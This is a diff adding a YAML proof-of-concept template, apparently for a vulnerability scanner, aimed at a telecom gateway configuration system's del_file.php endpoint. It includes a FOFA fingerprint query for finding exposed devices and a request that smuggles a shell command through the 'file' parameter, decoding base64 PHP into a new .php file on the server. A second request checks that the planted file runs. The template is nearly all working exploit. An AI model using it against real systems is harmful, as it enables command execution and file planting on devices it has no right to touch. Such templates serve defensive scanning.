@@ -1,0 +1,19 @@
+id: poc-yaml-Telecom-gateway-del-file-php-anyfile-upload
+info:
+  name: 电信网关配置管理系统 del_file.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 电信网关配置管理系统
+  fofa: body="img/login_bg3.png" && body="系统登录"
+variables:
+  t1: random_str(3)
+  t2: base64(concat(`<?php echo `,t1,`;?>`))
+requests:
+- method: GET
+  path: /manager/newtpl/del_file.php?file=1.txt%7Cecho%20{{.t2}}%20%7C%20base64%20-d%20%3E%20{{.t1}}.php
+  expression: status_code == 200 && body == ""
+- method: GET
+  path: /manager/newtpl/{{.t1}}.php
+  expression: status_code == 200 && body == t1
+transport: http
